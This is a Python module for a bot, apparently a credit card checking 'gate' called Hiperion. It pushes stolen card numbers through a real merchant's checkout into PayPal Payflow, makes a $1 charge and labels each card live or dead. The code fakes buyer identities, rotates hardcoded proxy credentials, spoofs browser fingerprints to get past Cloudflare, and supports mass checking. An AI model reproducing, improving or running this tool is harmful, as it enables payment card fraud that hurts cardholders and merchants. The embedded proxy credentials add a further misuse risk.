#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Hiperion Payflow 1 USD - Adaptado de payflow.py sin modificar su flujo/trabajo
Wrapper async para Hades V1 con timing para single y mass
Gate: Payflow 1 usd - Comando: /hi /himass - Nombre: Hiperion
Patched 2026-09-17: parse seguro, CF detection, timeouts, validaciones + proxies
"""
import asyncio
import re
import random
import time
import json
import base64
import traceback, urllib.parse
try:
    from curl_cffi.requests import Session as CurlSession
    HAS_CURL = True
except ImportError:
    HAS_CURL = False
    CurlSession = None
import cloudscraper
from datetime import datetime, timedelta
from faker import Faker
from collections import defaultdict

# Semáforos igual que otros gates (control concurrencia)
global_semaphore = asyncio.Semaphore(15)
user_semaphore = asyncio.Semaphore(3)
user_request_count = defaultdict(int)
active_requests_count = 0

TIMEOUT = 15
TIMEOUT_PAYFLOW = 25

PROXIES = [
    "http://iqgbcwxy:v2krgc0qmmv5@45.39.115.193:5604",
    "http://iqgbcwxy:v2krgc0qmmv5@107.181.142.44:5637",
    "http://iqgbcwxy:v2krgc0qmmv5@192.210.191.139:6125",
    "http://iqgbcwxy:v2krgc0qmmv5@23.236.196.141:6231",
]

def _normalize_proxy(proxy: str) -> str | None:
    if not proxy:
        return None
    proxy = proxy.strip()
    if "://" in proxy:
        scheme, rest = proxy.split("://", 1)
        if "@" not in rest and rest.count(":") == 3:
            user, pwd, host, port = rest.split(":")
            rest = f"{user}:{pwd}@{host}:{port}"
        if scheme not in ("http", "https"):
            scheme = "http"
        return f"http://{rest}"
    if "@" not in proxy and proxy.count(":") == 3:
        user, pwd, host, port = proxy.split(":")
        return f"http://{user}:{pwd}@{host}:{port}"
    if not proxy.startswith("http"):
        return f"http://{proxy}"
    return proxy

def _get_random_proxy(exclude=None) -> str:
    exclude = exclude or set()
    avail = [p for p in PROXIES if p not in exclude]
    if not avail:
        avail = PROXIES
    return random.choice(avail)

def _mask_proxy(proxy: str | None) -> str:
    if not proxy:
        return "direct"
    try:
        if "@" in proxy:
            return proxy.split("@")[-1]
        if "://" in proxy:
            return proxy.split("://")[-1]
        return proxy
    except:
        return "***"

def _close_session(sess):
    if sess is None:
        return
    try:
        sess.close()
    except Exception:
        pass

def _make_session(proxy=None):
    cur = _normalize_proxy(proxy)
    if HAS_CURL:
        kwargs = {"impersonate": "chrome120"}
        if cur:
            kwargs["proxies"] = {"http": cur, "https": cur}
        return CurlSession(**kwargs)
    else:
        seccion = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'ios', 'mobile': True}, delay=2)
        if cur:
            seccion.proxies.update({"http": cur, "https": cur})
        return seccion

def _extract_token_num(txt: str):
    import re, urllib.parse
    m = re.search(r'token=([^&]+)', txt, re.I)
    n = re.search(r'recordids=([^&]+)', txt, re.I)
    tok = urllib.parse.unquote(m.group(1).split('"')[0].split("'")[0].split('\\')[0].split('&')[0].strip()) if m else None
    num = n.group(1).split('"')[0].split("'")[0].split('\\')[0].split('&')[0].strip() if n else None
    return tok, num

# === Funciones copiadas intactas de payflow.py (con patch seguro) ===
def parse(text: str, a: str, b: str) -> str:
    try:
        return text.split(a)[1].split(b)[0]
    except (IndexError, AttributeError):
        return None

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

def _is_cf_block(text: str, status_code: int = None) -> bool:
    if status_code == 403:
        return True
    if status_code == 504:
        return True
    markers = ["just a moment","cf-challenge","challenges.cloudflare.com","attention required","cf_bm","__cf_chl","gateway time-out","origin_gateway_timeout","cloudflare"]
    if not text:
        return False
    low = text.lower()
    return any(m in low for m in markers)

def _check_response(resp, label: str):
    if resp is None:
        return False, f"{label}: sin respuesta"
    code = getattr(resp, 'status_code', None)
    txt = getattr(resp, 'text', '') or ''
    if _is_cf_block(txt, code):
        detail = txt[:600].replace('\n',' ') if txt else ''
        if code == 504:
            return False, f"{label}: Gateway time-out 504 Cloudflare - origen nigelbdesign no responde. Reintentar en 120s. Status={code} | {detail[:300]}"
        return False, f"{label}: Bloqueo Cloudflare detectado (Just a moment/403/504). IP posiblemente rate-limited/baneada. Requiere proxy residencial o Browserless. Status={code} | {detail[:300]}"
    if code is not None and code >= 400 and code in (403,503,429,504,520,521,522,523,524):
        return False, f"{label}: HTTP {code} - posible bloqueo Cloudflare/WAF | {txt[:400].replace(chr(10),' ') }"
    if not txt or len(txt.strip()) == 0:
        return False, f"{label}: respuesta vacia (len=0) Status={code}"
    return True, None

def procesar_y_validar(card):
    def es_fecha_anterior(mes, ano):
        fecha_actual = datetime.now().strftime('%Y-%m')
        fecha_proporcionada = f"{'20'+ano}-{mes:02}"
        return fecha_proporcionada >= fecha_actual
    KEYS = "/#%&()=?¿!¡*[]{}-_.:,;|@+"
    for KEY in KEYS:
        card = card.replace(KEY, "|")
    card = card.replace(" ", "|")
    match = re.search(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', card)
    if not match:
        return None
    values = card.split("|")
    if len(values) < 4:
        return None
    cc_number = values[0]
    mes = values[1]
    ano = values[2]
    ano = ano[2:] if len(ano) > 2 else ano
    cvv = values[3][0:4]
    if not es_fecha_anterior(mes, ano):
        return None
    return cc_number, mes, ano, cvv

def _sync_single(card, proxy=None):
    seccion = None
    try:
        resultado = procesar_y_validar(card)
        if resultado is None:
            return {
                "status": "❌ Dead",
                "message": "Fechas Invalidas"
            }

        cc_number, mes, ano, cvv = resultado

        faker = Faker()
        nombre = faker.first_name()
        apellido = faker.last_name()
        email = f'{nombre}{apellido}.{cc_number[6:12]}%40icloud.com'
        zip_code = faker.zipcode()
        street = faker.address()
        city = faker.city()
        state_abbr = faker.state_abbr()
        phone = ''.join([str(random.randint(0, 9)) for _ in range(10)])

        cur_proxy = _normalize_proxy(proxy)
        seccion = _make_session(proxy=cur_proxy)

        inicio = datetime.now()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }

        r1 = seccion.get(
            'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            headers=headers,
            timeout=TIMEOUT,
        )
        ok, err = _check_response(r1, "r1 GET nigelbdesign")
        if not ok:
            tiempo_val = float((datetime.now() - inicio).total_seconds())
            return {"status": "⚠️ Error", "message": f"{err} | Tiempo: {tiempo_val:0.2f}s"}

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://nigelbdesign.com',
            'priority': 'u=1, i',
            'referer': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        json_data = {
            'items': [
                {
                    'ItemID': 1062,
                    'Quantity': '0',
                    'CategoryID': 1021,
                    'Inventory': None,
                    'ItemNumber': 'NB-CIS',
                    'OrderType': 1,
                },
            ],
            'componentID': '1070',
            'type': '1',
            'addedFromPage': 'ItemDetail',
        }
        r2 = seccion.post('https://nigelbdesign.com/addtocart', headers=headers, json=json_data, timeout=TIMEOUT)
        ok, err = _check_response(r2, "r2 POST addtocart")
        if not ok:
            tiempo_val = float((datetime.now() - inicio).total_seconds())
            return {"status": "⚠️ Error", "message": f"{err} | Tiempo: {tiempo_val:0.2f}s"}
        token, num = _extract_token_num(r2.text)
        if not token:
            token = parse(r2.text, 'https://cart.thomasnet-navigator.com/cbcheckout/ViewCart?Token=', '","orderMinQty"')
            if not token:
                token = parse(r2.text, 'https://cart.thomasnet-navigator.com/cbcheckout/viewcart?token=', '"')
        if not num:
            num = parse(r2.text, 'recordids=', '\\"')
        if not token or not num:
            tiempo_val = float((datetime.now() - inicio).total_seconds())
            detail = r2.text[:600].replace('\n',' ')
            return {"status": "⚠️ Error", "message": f"r2 sin Token/recordids - respuesta inesperada (504/CF?) | {detail} | Tiempo: {tiempo_val:0.2f}s"}

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        params = {
            'token': token,
            'recordids': num,
        }
        r3 = seccion.get('https://nigelbdesign.com/addtocart', params=params, headers=headers, timeout=TIMEOUT)
        ok, err = _check_response(r3, "r3 GET addtocart")
        if not ok:
            tiempo_val = float((datetime.now() - inicio).total_seconds())
            return {"status": "⚠️ Error", "message": f"{err} | Tiempo: {tiempo_val:0.2f}s"}

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://cart.thomasnet-navigator.com',
            'priority': 'u=1, i',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        json_data = {
            'actionmode': 'proceedtocheckout',
            'items': [
                {
                    'ItemID': 1062,
                    'PreviousQuantity': 1,
                    'Quantity': '1',
                    'OrderID': 1334,
                    'RecordID': 1409,
                    'MinOrderQty': 1,
                    'ItemNumber': 'NB-CIS',
                    'OrderType': 'Order',
                },
            ],
            'shipping': {
                'TaxExempt': '',
            },
        }
        r4 = seccion.post(
            'https://cart.thomasnet-navigator.com/cbcheckout/viewcart',
            params=params,
            headers=headers,
            json=json_data,
            timeout=TIMEOUT,
        )
        ok, err = _check_response(r4, "r4 POST viewcart proceedtocheckout")
        if not ok:
            tiempo_val = float((datetime.now() - inicio).total_seconds())
            return {"status": "⚠️ Error", "message": f"{err} | Tiempo: {tiempo_val:0.2f}s"}

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9',
            'priority': 'u=0, i',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        r5 = seccion.get(
            'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling',
            params=params,
            headers=headers,
            timeout=TIMEOUT,
        )
        ok, err = _check_response(r5, "r5 GET shippingbilling")
        if not ok:
            tiempo_val = float((datetime.now() - inicio).total_seconds())
            return {"status": "⚠️ Error", "message": f"{err} | Tiempo: {tiempo_val:0.2f}s"}

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://cart.thomasnet-navigator.com',
            'priority': 'u=1, i',
            'referer': f'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling?token={token}&returnurl=https%3A%2F%2Fnigelbdesign.com%2Fitem%2Fanti-vibration-for-ptz-cameras%2Fcisco-style-camera-anti-vibration-platform-mounts%2Fnb-cis',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        json_data = {
            'actionmode': 'step1estimate',
            'items': None,
            'shipping': {
                'Addresses': [
                    {
                        'AddressType': '2',
                        'FirstName': nombre,
                        'LastName': apellido,
                        'CompanyName': '',
                        'Address1': '2018 Meadowview Drive',
                        'Address2': '',
                        'Address3': '',
                        'City': 'Ridgeway',
                        'StateShortName': 'MO',
                        'Region': '',
                        'State/Province_-_Shipping': '',
                        'CountryShortName': 'US',
                        'Zip': '64481',
                        'Phone': phone,
                        'Fax': '',
                        'Email': '',
                        'AddressNumber': '',
                    },
                ],
                'FreightOptions': [],
                'IsCheckout': True,
            },
        }
        r6 = seccion.post(
            'https://cart.thomasnet-navigator.com/cbcheckout/viewcart',
            params=params,
            headers=headers,
            json=json_data,
            timeout=TIMEOUT,
        )
        ok, err = _check_response(r6, "r6 POST step1estimate")
        if not ok:
            tiempo_val = float((datetime.now() - inicio).total_seconds())
            return {"status": "⚠️ Error", "message": f"{err} | Tiempo: {tiempo_val:0.2f}s"}

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://cart.thomasnet-navigator.com',
            'priority': 'u=1, i',
            'referer': f'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling?token={token}&returnurl=https%3A%2F%2Fnigelbdesign.com%2Fitem%2Fanti-vibration-for-ptz-cameras%2Fcisco-style-camera-anti-vibration-platform-mounts%2Fnb-cis',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        json_data = {
            'actionmode': 'save',
            'shipping': {
                'Addresses': [
                    {
                        'AddressType': '2',
                        'FirstName': nombre,
                        'LastName': apellido,
                        'CompanyName': '',
                        'Address1': '2018%20Meadowview%20Drive',
                        'Address2': '',
                        'Address3': '',
                        'City': 'Ridgeway',
                        'StateShortName': 'MO',
                        'Region': '',
                        'State/Province_-_Shipping': '',
                        'CountryShortName': 'US',
                        'Zip': '64481',
                        'Phone': phone,
                        'Fax': '',
                        'Email': email,
                        'AddressNumber': '',
                    },
                ],
                'FreightShippings': [],
                'GeneralShippings': [],
                'IsInternational': False,
                'IsCheckout': True,
                'IsFreight': False,
                'ErrorMessage': '',
                'FreightOptions': [],
                'TaxExempt': None,
                'ShippingTotal': None,
                'HandlingTotal': None,
                'TaxTotal': 0,
                'Total': None,
                'GeneralShippingKey': '128-Actual-41.71-0-4-0-0',
                'IsOnlyFreightServices': False,
                'ShippingAccountNumber': '',
                'IsValidAddress': True,
            },
            'isSaveAddress': False,
        }
        r7 = seccion.post(
            'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling',
            params=params,
            headers=headers,
            json=json_data,
            timeout=TIMEOUT,
        )
        ok, err = _check_response(r7, "r7 POST save")
        if not ok:
            tiempo_val = float((datetime.now() - inicio).total_seconds())
            return {"status": "⚠️ Error", "message": f"{err} | Tiempo: {tiempo_val:0.2f}s"}

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9',
            'priority': 'u=0, i',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        r8 = seccion.get(
            'https://cart.thomasnet-navigator.com/cbcheckout/paymentoptions',
            params=params,
            headers=headers,
            timeout=TIMEOUT,
        )
        ok, err = _check_response(r8, "r8 GET paymentoptions")
        if not ok:
            tiempo_val = float((datetime.now() - inicio).total_seconds())
            return {"status": "⚠️ Error", "message": f"{err} | Tiempo: {tiempo_val:0.2f}s"}
        securetokenid = parse(r8.text, 'paypal.com/?SecureTokenID=', '&amp')
        securetoken = parse(r8.text, 'SecureToken=', '"')
        if not securetokenid or not securetoken:
            tiempo_val = float((datetime.now() - inicio).total_seconds())
            detail = r8.text[:600].replace('\n',' ')
            return {"status": "⚠️ Error", "message": f"r8 sin SecureToken - respuesta inesperada | {detail} | Tiempo: {tiempo_val:0.2f}s"}

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-419,es;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://cart.thomasnet-navigator.com/',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        params = {
            'SecureTokenID': securetokenid,
            'SecureToken': securetoken,
        }
        r9 = seccion.get('https://payflowlink.paypal.com/', params=params, headers=headers, timeout=TIMEOUT_PAYFLOW)
        ok, err = _check_response(r9, "r9 GET payflowlink")
        if not ok:
            tiempo_val = float((datetime.now() - inicio).total_seconds())
            return {"status": "⚠️ Error", "message": f"{err} | Tiempo: {tiempo_val:0.2f}s"}
        csrf = parse(r9.text, 'name="CSRF_TOKEN" type="hidden" value="', '"')
        if not csrf:
            tiempo_val = float((datetime.now() - inicio).total_seconds())
            detail = r9.text[:600].replace('\n',' ')
            return {"status": "⚠️ Error", "message": f"r9 sin CSRF_TOKEN - payflowlink no retorno form | {detail} | Tiempo: {tiempo_val:0.2f}s"}

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://payflowlink.paypal.com',
            'priority': 'u=1, i',
            'referer': f'https://payflowlink.paypal.com/?SecureTokenID={securetokenid}&SecureToken={securetoken}',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'active',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        data = [
            ('subaction', ''),
            ('CARDNUM', '' + cc_number + ''),
            ('EXPMONTH', '' + mes + ''),
            ('EXPYEAR', '' + ano + ''),
            ('startdate_month', ''),
            ('startdate_year', ''),
            ('issue_number', ''),
            ('METHOD', 'C'),
            ('PAYMETHOD', 'C'),
            ('FIRST_NAME', nombre),
            ('LAST_NAME', apellido),
            ('template', ''),
            ('ADDRESS', '2018+Meadowview+Drive++'),
            ('CITY', 'Ridgeway'),
            ('STATE', 'MO'),
            ('ZIP', '64481'),
            ('COUNTRY', 'US'),
            ('PHONE', ''),
            ('EMAIL', ''),
            ('SHIPPING_FIRST_NAME', nombre),
            ('SHIPPING_LAST_NAME', apellido),
            ('ADDRESSTOSHIP', '2018+Meadowview+Drive++'),
            ('CITYTOSHIP', 'Ridgeway'),
            ('STATETOSHIP', 'MO'),
            ('ZIPTOSHIP', '64481'),
            ('COUNTRYTOSHIP', 'US'),
            ('PHONETOSHIP', ''),
            ('EMAILTOSHIP', ''),
            ('TYPE', 'A'),
            ('SHIPAMOUNT', '0.00'),
            ('TAX', '0.00'),
            ('VERBOSITY', 'HIGH'),
            ('flag3dSecure', ''),
            ('CURRENCY', 'USD'),
            ('STATE', 'MO'),
            ('swipeData', '0'),
            ('SECURETOKEN', f'{securetoken}'),
            ('SECURETOKENID', f'{securetokenid}'),
            ('PARMLIST', ''),
            ('MODE', ''),
            ('CSRF_TOKEN', f'{csrf}'),
            ('referringTemplate', 'minlayout'),
        ]
        r10 = seccion.post('https://payflowlink.paypal.com/processTransaction.do', headers=headers, data=data, timeout=TIMEOUT_PAYFLOW)
        ok, err = _check_response(r10, "r10 POST processTransaction")
        if not ok:
            tiempo_val = float((datetime.now() - inicio).total_seconds())
            return {"status": "⚠️ Error", "message": f"{err} | Tiempo: {tiempo_val:0.2f}s"}
        resptext = parse(r10.text, 'name="RESPTEXT" value="', '"')
        respmsg = parse(r10.text, 'name="RESPMSG" value="', '"')
        avsdata = parse(r10.text, 'name="AVSDATA" value="', '"')
        source = r10.text

        tiempo_val = float((datetime.now() - inicio).total_seconds())
        tiempo = f'{tiempo_val:0.2f}'

        try:
            with open("NBD Datos.txt", 'a', encoding='utf-8') as archivo:
                archivo.write(cc_number[:6] + '---' + source + '\n')
        except:
            pass

        if 'Approved' in source:
            status, result = "✅ Live", "Live Charged 1usd"
            return {"status": status, "message": f"{result} | Tiempo: {tiempo}s | AVS: {avsdata} | RESP: {respmsg}"}
        elif 'Insufficient funds available' in source:
            msg = parseX(source, 'name="RESPMSG" value="', '"/>') or respmsg
            status, result = "✅ Live", f"{msg} | AVS: {avsdata}"
            return {"status": status, "message": f"Fondos Insuficientes - {result} | Tiempo: {tiempo}s"}
        elif 'RESPMSG' in source:
            msg = parseX(source, 'name="RESPMSG" value="', '"/>') or respmsg
            status, result = "❌ Dead", f"{msg} | AVS: {avsdata}"
            return {"status": status, "message": f"{result} | Tiempo: {tiempo}s"}
        else:
            status, result = "⚠️ Error", "Avisar Al Admin"
            return {"status": status, "message": f"{result} | Tiempo: {tiempo}s | Fuente no reconocida"}

    except Exception as e:
        err_detail = str(e) or repr(e)
        low = err_detail.lower()
        print(f"[payflow proxy={_mask_proxy(proxy)}] {type(e).__name__}: {err_detail}\n{traceback.format_exc()}")
        if "timeout" in low or "timed out" in low or "read timeout" in low:
            hint = f"Timeout - payflow/nigelbdesign tardo demasiado (posible WAF/CF o payflowlink lento). Reintentar. | {err_detail[:250]}"
        elif "max retries" in low:
            hint = f"Desconexion/Max retries - nigelbdesign.com no responde o bloqueo CF | {err_detail[:250]}"
        elif "httpsconnectionpool" in low:
            hint = f"Desconexion - {err_detail[:250]}"
        elif "getaddrinfo" in low or "name or service not known" in low:
            hint = f"Error DNS - {err_detail[:250]}"
        elif "cloudflare" in low or "just a moment" in low:
            hint = f"Bloqueo Cloudflare - {err_detail[:250]}"
        elif "list index out of range" in low:
            hint = f"Parse fallo - respuesta inesperada sin Token/CSRF (504/CF?) | {err_detail[:250]}"
        elif "proxy" in low or "tunnel" in low or "socks" in low:
            hint = f"Error Proxy - {err_detail[:250]}"
        else:
            hint = f"{type(e).__name__}: {err_detail[:250]}"
        tiempo_val = float((datetime.now() - inicio).total_seconds()) if 'inicio' in locals() else 0.0
        return {"status": "⚠️ Error", "message": f"{hint} | Tiempo: {tiempo_val:0.2f}s"}
    finally:
        _close_session(seccion)

def _sync_payflow(card, proxy=None):
    # wrapper con rotación si no hay proxy explícito
    if proxy:
        return _sync_single(card, proxy=_normalize_proxy(proxy))
    tried = set()
    last = None
    for attempt in range(3):
        cur = _get_random_proxy(exclude=tried)
        tried.add(cur)
        res = _sync_single(card, proxy=cur)
        msg = res.get("message","")
        if any(k in msg for k in ("Gateway time-out 504", "Bloqueo Cloudflare", "Error Proxy", "Desconexion/Max retries", "Timeout -")):
            last = res
            if attempt < 2:
                time.sleep(random.uniform(0.5, 1.2))
                continue
            return res
        return res
    return last or _sync_single(card, proxy=_get_random_proxy())

# === Wrappers async con semáforos y timing ===

async def payflow_gate_check(card_data, user_id=None, proxy=None):
    global active_requests_count
    active_requests_count += 1
    try:
        if user_id is None:
            user_id = 0
        user_request_count[user_id] += 1
        try:
            async with global_semaphore:
                async with user_semaphore:
                    # pequeño delay para evitar burst
                    await asyncio.sleep(0.1 + (user_id % 5) * 0.05)
                    result = await asyncio.to_thread(_sync_payflow, card_data, proxy)
                    return result
        finally:
            user_request_count[user_id] -= 1
    except Exception as e:
        return {"status": "⚠️ Error", "message": f"Error al conectar con Hiperion: {str(e)[:250]}"}
    finally:
        active_requests_count -= 1

async def payflow_gate_check_multiple(cards_data, user_id=None, callback=None, proxy=None):
    if user_id is None:
        user_id = 0
    cards_data_limpios = [c.strip() for c in cards_data if c.strip()]
    results = [None] * len(cards_data_limpios)
    queue = asyncio.Queue()

    async def process_one(idx, card):
        try:
            await asyncio.sleep(0.1 + (idx % 5) * 0.05)
            # cada tarjeta usa proxy distinto rotado
            res = await payflow_gate_check(card, user_id, proxy)
            await queue.put((idx, res))
            return res
        except Exception as e:
            err = {"status": "⚠️ Error", "message": str(e)[:250]}
            await queue.put((idx, err))
            return err

    tasks = [asyncio.create_task(process_one(i, c)) for i, c in enumerate(cards_data_limpios)]

    async def processor():
        done = 0
        while done < len(cards_data_limpios):
            try:
                idx, res = await asyncio.wait_for(queue.get(), timeout=120.0)
                if results[idx] is None:
                    results[idx] = res
                    done += 1
                    if callback:
                        try:
                            await callback(idx, res, cards_data_limpios[idx], user_id)
                        except Exception as cb_err:
                            print(f"Error en callback Hiperion tarjeta {idx+1}: {cb_err}")
            except asyncio.TimeoutError:
                # marcar pendientes como error
                for i in range(len(cards_data_limpios)):
                    if results[i] is None:
                        results[i] = {"status": "⚠️ Error", "message": "Timeout Hiperion"}
                        done += 1
                        if callback:
                            try:
                                await callback(i, results[i], cards_data_limpios[i], user_id)
                            except:
                                pass
                break

    proc = asyncio.create_task(processor())
    await asyncio.gather(*tasks, return_exceptions=True)
    await proc
    return results
